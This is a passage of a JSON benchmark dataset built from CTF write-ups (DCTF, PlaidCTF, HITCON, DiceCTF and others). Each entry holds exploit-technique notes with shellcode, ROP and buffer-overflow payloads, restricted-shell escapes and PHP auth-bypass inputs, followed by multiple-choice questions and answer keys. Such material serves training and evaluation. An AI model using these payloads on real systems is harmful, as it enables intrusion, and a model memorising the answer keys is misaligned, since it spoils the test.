            "In challenges involving binary exploitation with restricted system calls due to seccomp filters, carefully analyze allowed syscalls to construct a functional payload. This may involve creative use of syscalls that are permitted to bypass the restrictions and achieve the intended exploit. For example, when direct execution syscalls (like `execve()`) are blocked, use allowed syscalls such as `sys_openat`, `sys_sendfile`, or `sys_chdir` to read or transmit data (e.g., a flag file) indirectly. Sample part of a shellcode could be as follows to change directory to root and open a file named \"flag.txt\":\n```assembly\nxor rdi, rdi                  ; Clear rdi\nmov rdi, 0xffffffffffffff9c   ; rdi = -100 (AT_FDCWD)\nxor rdx, rdx                  ; Clear rdx\nmov rsi, rsp                  ; rsi = address of \"flag.txt\"\nmov rax, 0xfffffffffffffeff   ; rax = -257 (sys_openat, avoiding null byte)\nneg rax                       ; rax = 257 (sys_openat)\nsyscall                       ; openat(-100, \"flag.txt\", O_RDONLY, 0)\n```",
            "When an exploit involves executing shellcode placed in memory, and the memory address is predictable (e.g., allocated with `mmap` at a fixed address), tailor the shellcode to fit the constraints of the execution environment, including avoiding null bytes if necessary and making sure the payload correctly utilizes the memory space. Use the knowledge of memory allocation behavior (for example, `mmap` usage with a fixed address) to accurately place and execute the shellcode. An essential part of the shellcode could involve jumping to or calling the exact memory address where the payload is written, in this case, `0xdead000`:\n```assembly\nmov rdi, 0xdead000            ; Move the address where shellcode is loaded into rdi\ncall rdi                      ; Call the address, executing the shellcode\n```\nNote: The specific assembly instructions and syscall numbers (in this context, represented as constants) must be adapted based on the challenge requirements and the syscall table of the target system."
        ],
        "question": [
            "In a scenario where a binary exploitation challenge is restricted by a seccomp filter that only permits certain system calls, given that `execve()` is blocked, which of the following system calls can be strategically combined to indirectly read or transmit the contents of a file named \"flag.txt\"?  - A. `sys_clone`, `sys_exit`, `sys_read`, `sys_write` - B. `sys_fork`, `sys_execve`, `sys_open`, `sys_send` - C. `sys_openat`, `sys_sendfile`, `sys_chdir`, `sys_read` - D. `sys_kill`, `sys_socket`, `sys_bind`, `sys_listen` ",
            "When given an exploit challenge where the shellcode must be executed from a specifically pre-allocated and known memory address (`0xdead000`) using the `mmap` system call, which approach is essential for correctly executing the placed shellcode?  - A. Inserting a NOP sled before the shellcode to ensure execution regardless of the exact jump address. - B. Directly calling the specific address (`0xdead000`) where the shellcode has been loaded. - C. Using stack pivoting techniques to redirect execution to the heap space. - D. Dynamically resolving the memory address at runtime before executing the shellcode. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Baby bof",
        "write_up": "dataset/raw/Baby bof.md",
        "type": "pwn",
        "competition": [
            "DCTF/2021",
            "https://ctftime.org/event/1361/tasks/"
        ],
        "score": 250,
        "max_score": 500,
        "difficulty": 0.5,
        "knowledge": [
            "When exploiting a binary with a Return-Oriented Programming (ROP) challenge, if the binary itself doesn't provide enough gadgets, one can leverage gadgets found in libc. This approach requires leaking an address from the Global Offset Table (GOT) to calculate the libc base address. From there, system function and \"/bin/sh\" string location within libc can be found to execute arbitrary commands. Condition: The binary must be dynamically linked with libc and have functions imported from libc that can be used to leak addresses.\n\nExample payload snippet: \n```Python\n# Leak address from GOT\nfgets_got = elf.symbols['got.fgets']  \n# Calculate addresses\nlibc_address = (fgets_address - fgets_libc)\nsystem_address = system_libc + libc_address\nsh_address = sh_libc + libc_address\n```",
            "In scenarios where a direct call to the system function with \"/bin/sh\" as an argument does not spawn a shell, inserting a \"ret\" gadget before the system call can resolve issues related to stack alignment on x86_64 systems. This is crucial when exploiting binaries on remote systems where the libc version might differ, causing unexpected behaviors unless the stack is correctly aligned.\n\nExample payload adjustment:\n```Python\nret = next(elf.search(asm('ret')))\n# Payload adjusted to include 'ret' gadget\np.sendline(b'\\x41'*18 + p64(ret) + bytes(rop))\n```"
        ],
        "question": [
            "In the context of exploiting a binary using Return-Oriented Programming (ROP), when the provided binary lacks sufficient gadgets, leveraging libc's gadgets becomes viable. Given this scenario, which step is necessary to exploit the binary using libc's gadgets successfully? - A. Directly call the system function in the binary with a hardcoded address. - B. Overwrite the GOT entry of a function to redirect execution to a desired libc gadget. - C. Leak an address from the Global Offset Table (GOT) and calculate the libc base address to find the system function and \"/bin/sh\" string location. - D. Modify the binary in memory to include additional ROP gadgets.",
            "When attempting remote exploitation of a binary on an x86_64 system and facing issues with directly calling the system function with \"/bin/sh\" as an argument, which step is critical to resolving stack alignment problems? - A. Insert a \"jmp\" gadget before the system call to enhance payload redirection. - B. Use a \"nop\" slide before the system call to ensure the shellcode is executed. - C. Insert a \"ret\" gadget before the system call to correct stack alignment. - D. Append multiple \"push\" instructions before the system call to manipulate stack space."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Baby buffer overflow",
        "write_up": "dataset/raw/Baby buffer overflow.md",
        "type": "pwn",
        "competition": [
            "kksctf/2019",
            "https://ctftime.org/event/874/tasks/"
        ],
        "score": 100,
        "max_score": 1000,
        "difficulty": 0.1,
        "knowledge": [
            "In buffer overflow challenges where the `gets` function is used without input length checks, attackers can overwrite the return address of the current function. This is achievable by crafting a payload that fills the buffer and then specifies a new address to redirect the execution flow. The payload structure for such scenarios would usually be `padding (to fill the buffer) + saved EBP (if needed) + return address`.",
            "When a challenge binary includes a function that results in the desired outcome when executed (e.g., printing a flag, opening a shell), and this function requires specific arguments, it's possible to redirect the program's execution to this function by overwriting the return address. The payload in this context should also include the arguments the function expects right after the overwritten return address. If the target function requires arguments, these should be pushed onto the stack in reverse order before the return address that jumps to the target function. Payload format: `buffer overflow + saved EBP (optional) + function address + return address (optional) + arguments (if any)`. Sample payload: `\"A\" * buffer_size + \"B\" * 4 + p32(function_address) + p32(return_address) + p32(argument)`."
        ],
        "question": [
            "In the context of a buffer overflow vulnerability where the `gets` function is used, assuming the buffer's starting address is known and there is no input length validation, which of the following represents the correct order to craft a payload to modify the program's execution flow?  - A. return address + buffer overflow data + saved EBP - B. saved EBP + return address + NOP sled - C. NOP sled + buffer overflow data + return address - D. buffer overflow data + saved EBP + return address ",
            "Within a buffer overflow challenge, if you're attempting to call a function named `win()` that takes a single argument and you have control over the execution flow by overwriting the return address, which option correctly outlines the structure of the payload you should send where `win_addr` is the address of `win()` function and `arg` is the argument it requires?  - A. `win_addr` + buffer overflow data + `arg` - B. buffer overflow data + `win_addr` + `arg` - C. buffer overflow data + `win_addr` + saved EBP + `arg` - D. buffer overflow data + saved EBP + `win_addr` + `arg` "
        ],
        "answer": [
            "D",
            "D"
        ]
    },
    {
        "name": "Baby crypto revisited",
        "write_up": "dataset/raw/Baby crypto revisited.md",
        "type": "crypto",
        "competition": [
            "LINE/2022",
            "https://ctftime.org/event/1472/tasks/"
        ],
        "score": 138,
        "max_score": 341,
        "difficulty": 0.4046920821114369,
        "knowledge": [
            "When given ECDSA signatures with a partially known nonce (k_), a reduction attack can be performed by deriving new signatures from the known part of k_ and the original signatures (r, s, and hash). This is achievable by assuming k = k_ + a, where a is the unknown part of the nonce, and calculating new values of r, s, and the hash (h_new) to create a new signature pair that leverages the known bits of k. This process allows for the transformation of the problem into a biased nonce attack scenario, where the nonce's upper unknown bits are set to a fixed value or zero, simplifying the attack.",
            "To recover the private key from ECDSA signatures when a biased nonce is employed, one can use lattice-based techniques, specifically solving the Hidden Number Problem (HNP) with tools like the LLL algorithm. This approach is particularly effective when a significant number of signatures are available, and the nonce's bias is towards a predictable or fixed pattern. In the given scenario, knowing half of the 128-bit nonce and having 100 sample signatures were sufficient conditions to apply LLL after transforming the signatures to use biased nonces, ultimately leading to the successful extraction of the private key.\n\nThese strategies emphasize the importance of securely generating nonces in ECDSA to prevent the feasibility of such attacks."
        ],
        "question": [
            "In a scenario where ECDSA signatures are given with a partially known nonce (64-bit known out of 128), and you need to conduct a reduction attack to derive new signatures leveraging this partial nonce. How can you mathematically manipulate the given (r, s, hash) signatures and the known nonce bit (\\(k_\\)) to prepare for a biased nonce attack? - A. Add \\(k_\\) to each component (r, s, hash) directly to obtain new signature values. - B. Use \\(k = k_ + a\\) to calculate \\(r_{new}\\), \\(s_{new}\\), and \\(h_{new}\\) by assuming \\(a\\) as the unknown part of the nonce and utilizing the original \\(r\\), \\(s\\), and hash in the calculations. - C. Multiply \\(r\\), \\(s\\), and hash by \\(k_\\) to generate new signature values directly without any further transformations. - D. Subtract \\(k_\\) from \\(r\\), \\(s\\), and the hash to obtain new signatures that are suitable for the biased nonce attack.",
            "In an attack scenario aimed at recovering the private key from ECDSA signatures when the nonce is biased (part of it being fixed or known), utilizing lattice-based techniques like LLL to solve the Hidden Number Problem (HNP) is suggested. Given that there are 100 sample signatures and a known 64-bit portion of the 128-bit nonce, which condition is crucial for the effectiveness of applying lattice techniques to successfully extract the private key? - A. The message must be encrypted using a symmetrical algorithm to ensure the lattice technique is applicable. - B. The nonce must be entirely unknown, requiring guesses for its entire space to apply lattice methods effectively. - C. There must be a significantly large number of signatures, and a portion of the nonce (like its MSBs or LSBs) must be consistently predictable or known, to form a pattern suitable for lattice analysis. - D. The private key must be guessed iteratively until the correct value is found, making lattice techniques secondary in the recovery process."
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Baby Encoder",
        "write_up": "dataset/raw/Baby Encoder.md",
        "type": "crypto",
        "competition": [
            "TMUCTF/2021",
            "https://ctftime.org/event/1427/tasks/"
        ],
        "score": 489,
        "max_score": 500,
        "difficulty": 0.978,
        "knowledge": [
            "When dealing with custom encoding schemes that involve sequential XOR operations, including mirroring (XORing each byte with its \"mirror\" in the array), and the initial character of the flag is known (commonly the closing curly brace `}` in CTF challenges), it's possible to reverse the encoding by applying the XOR operations in reverse order. This technique utilizes known plaintext information to sequentially \"unmix\" the bytes to retrieve the original message.\n   - Sample of reverse XOR operation when the last character is known (`}` assumed as last character):  \n     ```python\n     def decode_xor_with_mirror(data, last_char_ord):\n         new_data = []\n         for i in range(len(data)-1, -1, -1):\n             last_char_ord = last_char_ord ^ data[i]\n             new_data.append(last_char_ord)\n         new_data.reverse()\n         # Adjust the order due to initial XOR operation specifics\n         new_data = new_data[1:] + new_data[:1]\n         return new_data\n     ```",
            "For custom displacement functions that rearrange byte positions based on certain conditions without altering byte values, and when used in multiple iterations with varying parameters, observing the function's behavior can reveal that such displacements might reach an original or known state after a specific number of iterations. This insight allows for applying the same displacement function in reverse by carefully counting the required iterations to undo the displacement effects.\n   - Example of applying displacement function in reverse with calculated iterations:\n     ```python\n     def displace(a, base):\n         # Function body as described in challenge write-up\n         pass\n\n     # Applying the function with reverse iterations for each displacement base\n     def reverse_displacement(encoded_data):\n         bases_and_iterations = [(72, 30), (66, 310), (60, 4290), (54, 2590), (48, 37128), (42, 168), (36, 18), (30, 60), (24, 42), (18, 36), (12, 20), (6, 12)]\n         for base, iterations in reversed(bases_and_iterations):\n             for _ in range(iterations):\n                 encoded_data = displace(encoded_data, base)\n         return encoded_data\n     ```\n   - This approach assumes that the displacement function does not inherently alter the data but only rearranges it, and that applying the function enough times in a specific pattern can restore the original sequence of bytes."
        ],
        "question": [
            "In the process of decoding an encoded string where each byte was XORed with its previous byte and the initial byte XOR operation involved a known character, which of the following approaches is correct for reversing the encoding to retrieve the original string if the last character of the input data is known?  - A. Calculate the XOR between consecutive bytes starting from the beginning of the data, using the known character as the initial value. - B. Reverse the data array and XOR each byte with the subsequent byte, starting from the known character. - C. Perform a XOR operation between each byte and its mirror in the array, using a dynamic shift based on the data length. - D. Starting from the last byte, XOR it with the known character, and continue this process in reverse order through the data array, finally adjusting the byte sequence due to the initial XOR specifics. ",
            "When attempting to reverse a custom displacement of byte positions in an encoded string, where the displacement function rearranges bytes based on certain conditions without changing their values and it's applied multiple times with varying bases, which approach is correct for determining the original sequence of bytes?  - A. Apply the displacement function with the same bases and iterations in the order it was applied initially. - B. Sequentially XOR each byte with a fixed value based on its position in the array to reverse the displacement. - C. For each displacement base, apply the displacement function an equal number of times in reverse order from how it was originally applied. - D. Observe the pattern of displacement and apply a mathematical formula to calculate the original position of each byte without using the displacement function. "
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "baby heap question mark",
        "write_up": "dataset/raw/baby heap question mark.md",
        "type": "pwn",
        "competition": [
            "PlaidCTF/2023",
            "https://ctftime.org/event/1770/tasks/"
        ],
        "score": 200,
        "max_score": 700,
        "difficulty": 0.2857142857142857,
        "knowledge": [
            "In scenarios dealing with heap-based buffer management vulnerabilities, particularly in applications written in Rust running under Wine on Linux, an exploit can often be achieved by manipulating buffer allocation and deallocation to cause buffer overflow or arbitrary read/write conditions. This is especially effective if the application implements a simple command-line interface (CLI) for buffer operations such as allocate, drop, read, and write. The vulnerability can be exploited by creating and deleting buffers in a specific order to manipulate the application's memory layout, allowing for the modification of pointer and size attributes of buffers. This approach can lead to arbitrary code execution by overwriting critical function pointers or directly injecting and executing shellcode.\n\n    Example exploit steps:\n    - Allocate several small buffers.\n    - Drop one of the buffers to create a gap in the memory layout.\n    - Allocate a large buffer that fills the gap and overlaps with the metadata of other buffers.\n    - Use further read or write operations to manipulate the size and pointer of a buffer, turning it into an arbitrary read/write primitive.",
            "When developing exploits, especially in constrained or unusual environments (e.g., Linux applications running Windows binaries through Wine), reproducing the exact remote environment locally is crucial for the successful development and execution of exploits. Differences in environment setup, such as Wine configurations, can lead to discrepancies between local testing and remote exploitation outcomes. By mirroring the remote environment as closely as possible, including software versions and configuration settings, one can minimize these differences and ensure that an exploit that works locally will also work when deployed against the remote target.\n\n    Example approach for environment replication:\n    - Ensure the local testing environment matches the remote environment's specifications (OS version, kernel version, software packages, etc.).\n    - Use Docker or similar containerization tools to quickly spin up environments that mimic the target setup, including the installation of specific software versions indicated by the challenge (e.g., using the same Dockerfile provided in the challenge).\n    - Consider potential environment-specific mechanisms (e.g., Wine's implementation details) that might affect how memory is managed or how binaries are executed, and adjust the exploit approach accordingly."
        ],
        "question": [
            "In a Capture the Flag (CTF) challenge scenario, where an application written in Rust is running under Wine on a Linux system, what technique could be exploited for arbitrary code execution through manipulation of heap-based buffer management?  - A. Use a buffer overflow in a static array to overwrite a return address. - B. Leverage pointer arithmetic errors in stack-based buffers to manipulate local variables. - C. Manipulate buffer allocation and deallocation to create an arbitrary read/write condition by overwriting buffer size and pointer metadata. - D. Exploit stack canaries by guessing their values through brute force and then altering the control flow of the application. ",
            "When developing an exploit for a Linux system running a Windows binary through Wine, as presented in a CTF challenge, what is the most crucial approach to ensure the exploit also works remotely as it does locally?  - A. Increase the complexity of the exploit code to cover all possible environment configurations. - B. Reproduce the remote environment locally as closely as possible, including the exact versions of Wine and other relevant software, using tools like Docker. - C. Focus purely on universal exploits that do not depend on the environment in which the binary is executed. - D. Limit the exploit to only what is necessary to bypass local firewalls and antivirus solutions. "
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "Baby MD5",
        "write_up": "dataset/raw/Baby MD5.md",
        "type": "The type of this CTF challenge is crypto.",
        "competition": [
            "ASIS/2020/Finals",
            "https://ctftime.org/event/1111/tasks/"
        ],
        "score": 78,
        "max_score": 500,
        "difficulty": 0.156,
        "knowledge": [
            "In challenges requiring the generation of strings that produce hash values with specific characteristics (e.g., ending with certain hex digits or matching certain patterns), a practical approach involves iteratively generating strings and computing their hash values until a match is found. This can be done by either generating random strings of the required length or incrementing a counter padded to the required length and calculating its hash. Depending on the exact requirements (e.g., length and hash function specified), this iterative method can find a match within a feasible amount of time due to the limited search space defined by the challenge parameters.\n   - Example payload generation approach: \n     ```python\n     import random, string, hashlib\n     def generate_string_matching_hash_suffix(target_suffix, length, hash_function):\n         while True:\n             candidate = ''.join(random.choice(string.ascii_letters) for _ in range(length))  # Or use a padded counter string\n             if hash_function(candidate.encode('utf-8')).hexdigest().endswith(target_suffix):\n                 return candidate\n     ```",
            "For challenges involving finding two strings that, after being hashed multiple times (possibly with different iteration counts), result in the same hash value, one approach is to exploit predictable patterns in the hash output or specific conditions (e.g., a fixed prefix might coincide with hex characters). If the conditions allow (e.g., when the hash function is MD5 and the iteration count for one string is higher than the other), one can find a string that hashes to a required pattern after a certain number of iterations. This string can then serve as the input for the lower iteration count, ensuring both strings eventually hash to the same value after their respective number of iterations.\n   - Example approach:\n     ```python\n     import hashlib\n     def find_matching_hash_pair(m, n, x_head, y_head, hash_function):\n         while True:\n             x = x_head + ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))\n             x_hash = x\n             for _ in range(m-n):  # Adjust based on iteration difference\n                 x_hash = hash_function(x_hash.encode('utf-8')).hexdigest()\n             if x_hash.startswith(y_head):  # Assuming y_head is a pattern like 'dead'\n                 y = x_hash\n                 return (x, y)\n     ```"
        ],
        "question": [
            "In a task requiring finding a string that produces a specific hash suffix, what is the most efficient approach for generating potential strings? - A. Manually curate a list of strings and test each one until a match is found. - B. Use a fixed string and modify it slightly in each iteration until the hash matches the target suffix. - C. Generate strings iteratively by either random generation or incrementing a counter, then hash each string to check for a match. - D. Wait for a user to input potential matches rather than generating strings programmatically. ",
            "When the goal is to find two strings where repeated hashing (with possibly different iteration counts) results in the same hash value, under which condition could this be practically achieved? - A. Both strings must start and end with the same characters before hashing. - B. One of the strings must contain no numerical digits to ensure hash collision. - C. The algorithm must incorporate a machine learning model to predict hash collisions effectively. - D. If the hashing conditions allow (e.g., MD5 hash and a prefixed pattern matching certain hex characters), one string's hash can serve as the other's starting point, especially when iteration counts differ. "
        ],
        "answer": [
            "C",
            "D"
        ]
    },
    {
        "name": "Baby Onion",
        "write_up": "dataset/raw/Baby Onion.md",
        "type": "This CTF challenge appears to be a crypto type challenge.",
        "competition": [
            "DawgCTF/2020",
            "https://ctftime.org/event/1030/tasks/"
        ],
        "score": 150,
        "max_score": 500,
        "difficulty": 0.3,
        "knowledge": [
            "When encountering a file with unknown content or extension, the first step should be to use a tool like `file` to identify the content type, which might reveal it as ASCII text or another recognizable format. This foundational step can guide the subsequent analysis or decoding efforts appropriate for the content type detected.",
            "In cybersecurity challenges, encoded data can be layered, requiring iterative decoding processes. When the data is encoded using multiple algorithms (e.g., hexadecimal and Base64), a recursive or iterative decoding script in a language like Python can be written to automate the decoding process until the hidden message or flag is revealed. Iterating between different decoding schemes based on the data's appearance (e.g., presence of base64 padding, hexadecimal characters) can efficiently uncover nested encodings.\n\nExample iterative decoding process in Python:\n```python\nimport base64\n\n# Assuming `data` is the encoded string to start with.\nwhile True:\n    try:\n        # Attempt hexadecimal decoding\n        decoded = bytes.fromhex(data).decode()\n        print(decoded)  # Optional: for verification\n        data = decoded\n    except ValueError:\n        # Hexadecimal decoding failed -> Attempt base64 decoding\n        decoded = base64.b64decode(data).decode()\n        print(decoded)  # Optional: for verification\n        data = decoded\n```"
        ],
        "question": [
            "When presented with a file that has an unfamiliar extension, what should be the initial step in analyzing its content? - A. Attempt to open it with a text editor and guess the content type. - B. Use a specific decoding tool based on the file's extension. - C. Employ a tool like `file` to ascertain the content type, potentially identifying it as ASCII text or another format. - D. Immediately start decoding with common encodings like Base64 or hexadecimal.",
            "Which approach is effective for decoding data that has been encoded multiple times using different algorithms, such as hexadecimal and Base64? - A. Manually decode each layer one at a time, using different tools for each encoding. - B. Write an iterative script in Python that alternates decoding attempts between hexadecimal and Base64 until the original message is revealed. - C. Decode the entire string using a universal decoder that automatically identifies and applies all necessary decoding algorithms. - D. Use an online service to detect the encoding types and then decode them individually in the reverse order of their application."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Baby Shock",
        "write_up": "dataset/raw/Baby Shock.md",
        "type": "misc",
        "competition": [
            "HITCON/2020",
            "https://ctftime.org/event/1136/tasks/"
        ],
        "score": 201,
        "max_score": 384,
        "difficulty": 0.5234375,
        "knowledge": [
            "When faced with a restricted shell environment where direct command execution is limited, methodical testing of syntax characters (like `;`, `&`, `|`, etc.) can help identify ways to bypass restrictions. If semicolon (`;`) is not filtered, it can be used to separate commands and execute additional commands outside of the restricted environment.\nExample payload: `id ; whoami`",
            "In scenarios where direct interactive shell access is denied, leveraging text editors that have command execution capabilities (e.g., `vim`, `emacs`, etc.) can be an effective workaround. By opening `vim` and then exiting to a command mode within it (`:shell`), one can escape a restricted shell and obtain a fully interactive shell environment.\nExample payload sequence: \n   1. Open `vim`: `id ;vim`\n   2. Exit to `vim` command mode: `exit`\n   3. Enter command mode in `vim`: `:shell`\n   4. Execute desired command: `/readflag`"
        ],
        "question": [
            "In a restricted shell environment where certain characters and commands are blocked, which of the following method can be used to bypass the restriction and execute additional commands if the semicolon (`;`) character is not filtered? - A. Use the `grep` function to search for semicolons in files - B. Invoke a new bash shell using the `bash` command without any special characters - C. Combine commands with a semicolon (`;`) to execute them sequentially outside of the restricted commands - D. Directly edit system configuration files to remove the restrictions",
            "When direct interactive shell access is not available due to restrictions, and assuming `vim` is accessible, which sequence of actions can be used to escape the restricted shell and obtain a fully interactive shell environment? - A. Use `vim` to edit a script file and then run it with python - B. Execute `vim`, then use `:wq` to save and quit, attempting to crash the restricted shell - C. Open `vim`, exit to `vim` command mode with `exit`, enter `:shell` in `vim` to get a shell, and execute commands - D. Start `vim` and repeatedly press the escape key hoping to trigger a glitch to escape the shell"
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Baby Web 1",
        "write_up": "dataset/raw/Baby Web 1.md",
        "type": "web",
        "competition": [
            "RaziCTF/2020",
            "https://ctftime.org/event/1167/tasks/"
        ],
        "score": 670,
        "max_score": 996,
        "difficulty": 0.6726907630522089,
        "knowledge": [
            "When dealing with PHP authentication systems where `password_hash()` and `password_verify()` are used, it is crucial to remember that using `PASSWORD_BCRYPT` for hashing will truncate the input to a maximum length of 72 characters. This behavior can be exploited in scenarios where bypassing authentication checks is needed, and the application does not correctly handle or validate input lengths before hashing. It's advisable to test inputs of varying lengths to observe any unexpected behavior, such as authentication bypass or incorrect handling of input data.",
            "In scenarios where a PHP application uses both `mb_strlen()` (which counts multibyte characters) and `strlen()` (which counts bytes), one can bypass checks that compare these lengths by crafting inputs that have a different number of multibyte characters versus bytes. By carefully selecting inputs where the byte length (`strlen()`) and character length (`mb_strlen()`) differ, one can exploit logic flaws in the application, especially in authentication or input validation mechanisms. This technique requires the crafted input to still be meaningful to the application logic or the specific vulnerability being exploited.  \nExample payload for the given scenario: `66842480683974257935677681585401189190148531340690145540123461534603155084209$(printf '\\u1337\\u1337')`"
        ],
        "question": [
            "In the context of a PHP web application utilizing `password_hash()` with `PASSWORD_BCRYPT`, how does the algorithm's handling of input length affect security measures when implementing authentication checks? - A. It has no impact; all input lengths are treated equally. - B. Only inputs exactly 72 characters long are hashed, shorter or longer inputs are ignored. - C. Inputs longer than 72 characters are truncated, potentially allowing for authentication bypass if not properly handled. - D. Every character after the 72nd is replaced with a special symbol to flag potential tampering attempts.",
            "When attempting to bypass a length-based authentication check in a PHP application that compares the outcomes of `strlen()` and `mb_strlen()`, which approach is effective in crafting a suitable input? - A. Ensuring the `strlen()` of the input is the same as the `mb_strlen()`, to avoid detection. - B. Crafting an input where the number of bytes (`strlen()`) is greater than the number of multibyte characters (`mb_strlen()`), exploiting the check logic. - C. Creating an input composed entirely of multibyte characters to make the `strlen()` less than `mb_strlen()`. - D. Using only ASCII characters in the input to maintain equal lengths for both `strlen()` and `mb_strlen()`, bypassing the logic flawlessly."
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "baby-bof",
        "write_up": "dataset/raw/baby-bof.md",
        "type": "This write-up describes a buffer overflow challenge in which the goal is to exploit a vulnerability in the `vuln` function to jump to the `flag` function in order to obtain the flag. Based on the description and solution provided, this challenge falls under the category of `pwn` (short for \"binary exploitation\").",
        "competition": [
            "Defcamp/2023/Quals",
            "https://ctftime.org/event/2106/tasks/"
        ],
        "score": 10,
        "max_score": 347,
        "difficulty": 0.02881844380403458,
        "knowledge": [
            "In buffer overflow challenges, when the program uses `gets()` for input, it's susceptible to buffer overflow due to `gets()`'s inability to check the length of the input against the buffer size. This can be exploited by crafting an input that fills the buffer and overwrites the return address on the stack with the address of a function (e.g., a `flag` function) that we want to execute. Example payload: `python -c \"print('A'*136 + '\\x67\\x07\\x40\\x00\\x00\\x00\\x00\\x00')\" | ./binary`.",
            "If the binary has a misalignment issue causing a crash after a buffer overflow exploit, inserting a return (ret) gadget before the intended function address can help realign the stack. This technique is particularly useful when PIE (Position Independent Execution) is not enabled, allowing for hardcoded addresses. Find a `ret` gadget using a tool like ROPGadget, and place it before the target function address in the payload. Example payload for alignment correction: `python -c \"print('A'*136 + '\\xde\\x05\\x40\\x00\\x00\\x00\\x00\\x00' + '\\x67\\x07\\x40\\x00\\x00\\x00\\x00\\x00')\" | ./binary`."
        ],
        "question": [
            "In an exploitation scenario where a program reads user input using the `gets()` function into a fixed-size buffer without validating the length of the input, which of the following would be the best explanation for why it's susceptible to a buffer overflow attack?  - X.To trigger a buffer overflow, an attacker needs to provide input that exceeds the buffer size, allowing them to potentially overwrite important data on the stack, such as the return address. This can lead to arbitrary code execution if the overwritten return address points to malicious code. - Y.`gets()` function automatically reallocates the buffer size based on the incoming data size, which prevents buffer overflow attacks by ensuring the buffer is always the correct size for the input. - Z.The `gets()` function uses advanced machine learning algorithms to predict and prevent buffer overflow attacks by sanitizing user inputs based on past data patterns. - A.`gets()` encrypts input data making it impossible to inject malicious code through buffer overflow techniques. ",
            "When addressing a misalignment issue that causes a crash after a buffer overflow exploit, particularly in a scenario where PIE is disabled, which technique is advisable to realign the stack before jumping to the desired function address?  - Y.Inserting multiple `nop` sleds before the target function address in the payload to ensure that the stack pointer increments sufficiently to align the stack correctly. - A.Adding a return (`ret`) gadget address before the intended function's address in the exploit payload to adjust the stack alignment appropriately, facilitating a smooth execution flow to the desired function. - Z.Using a randomization technique to shuffle the payload bytes before sending it, which can sometimes accidentally realign the stack due to the probabilistic nature of buffer overflows. - X.Applying a delay in the execution flow using `sleep` calls between buffer overflows attempts to give the system's automatic alignment correction routines time to work. "
        ],
        "answer": [
            "X",
            "A"
        ]
    },
    {
        "name": "baby-rsa",
        "write_up": "dataset/raw/baby-rsa.md",
        "type": "crypto",
        "competition": [
            "DiceCTF/2022",
            "https://ctftime.org/event/1541/tasks/"
        ],
        "score": 117,
        "max_score": 500,
        "difficulty": 0.234,
        "knowledge": [
            "When facing RSA encryption challenges where the exponent \\(e\\) is a perfect divisor of \\(p-1\\) and \\(q-1\\), employing the `nth_root()` function from SageMath can significantly simplify the process of decrypting RSA messages. This approach is particularly beneficial because it allows for direct extraction of all possible roots, a strategy applicable in scenarios where traditional RSA decryption methods are not straightforward due to unique properties of the RSA setup, such as the exponent \\(e\\) being a higher power and not just a simple divisor.\n   \n   Example command: `p_roots = mod(cipher, p).nth_root(e, all=True)`",
            "In RSA challenges, when the encryption modulus \\(N\\)'s prime factors \\(p\\) and \\(q\\) are known or can be easily determined using public factor databases like Factordb.com, computing the totient \\(\\phi(N)\\) and the decryption exponent \\(d\\) becomes possible. This enables decryption of the ciphertext \\(c\\) with \\(d\\), regardless of the size of \\(e\\), as long as \\(e\\) and \\(\\phi(N)\\) are coprime. This knowledge is especially useful in cases where the RSA challenge hints at or reveals an unusually large \\(e\\), and the direct factoring approach remains viable due to the manageable size of \\(N\\).\n\n   Example command to decrypt the ciphertext after finding \\(d\\): `m = pow(c, d, n)`"
        ],
        "question": [
            "In an RSA encryption challenge, given the unique condition where the encryption exponent \\(e\\) exactly divides \\(p-1\\) and \\(q-1\\), which function in SageMath is the most suited to extract all possible plaintexts from a given ciphertext? - A. `mod().sqrt()` - B. `mod().pow()` - C. `mod().nth_root(e, all=True)` - D. `gcd()`",
            "In an RSA encryption setup where the prime factors of the modulus \\(N\\) are known, what is the immediate next step to decrypting a ciphertext \\(c\\) using these primes? - A. Calculate \\(\\phi(N)\\) using \\(p\\) and \\(q\\), then compute the decryption key \\(d\\). - B. Add \\(p\\) and \\(q\\) to find the sum \\(\\Sigma N\\). - C. Multiply \\(c\\) by \\(p\\) and \\(q\\). - D. Divide \\(N\\) by \\(e\\) to find the quotient."
        ],
        "answer": [
            "C",
            "A"
        ]
    },
    {
        "name": "babybof",
        "write_up": "dataset/raw/babybof.md",
        "type": "reverse",
        "competition": [
            "castorsCTF/2020",
            "https://ctftime.org/event/1063/tasks/"
        ],
        "score": -1.0,
        "max_score": 496,
        "difficulty": -1,
        "knowledge": [
            "When dealing with a buffer overflow vulnerability in a minimalistic binary with limited ROP gadgets, consider pivoting the stack into a writable section such as the BSS segment. This can enable further control over the program's flow, especially when the number of usable gadgets is low. Pivoting can be achieved by overwriting the saved base pointer (`rbp`) to point to a new location in the BSS segment and then returning to a `leave; ret;` gadget to set the stack pointer (`rsp`) to that new location.",
            "In scenarios where the global offset table (GOT) is read-only, but there is a need to execute system calls or functions from libc that are not directly callable from the binary's limited gadgets, leverage writable pointers to `stdin`, `stdout`, or `stderr` in the BSS section. By overwriting these pointers and controlling their use as function pointers or return addresses, one can indirectly manipulate the control flow to execute arbitrary code or system functions. This technique is particularly useful in constrained environments, like when trying to trigger a one-gadget execution in libc but unable to do so directly due to read-only restrictions on the GOT. \n\nExample Payload Segment for Stack Pivot:\n```php\n$payload = str_repeat(\"A\", 0x28) . pack(\"Q*\",\n    POPRBP, BSS + 0x50 + 0x20,\n    READ,\n);\n```\n\nExample Payload Segment for Partial Overwrite using stream buffer pointers:\n```php\n$payload .= str_repeat(\"\\x00\", 0x28);\n$payload .= pack(\"Q\", RET);  // Set up for return instruction to execute next instruction from overwritten pointer\n$payload .= substr(pack(\"Q\", $what), 0, 3);  // Overwrite least significant bytes of pointer to `stdin`, `stdout`, or `stderr`\n```"
        ],
        "question": [
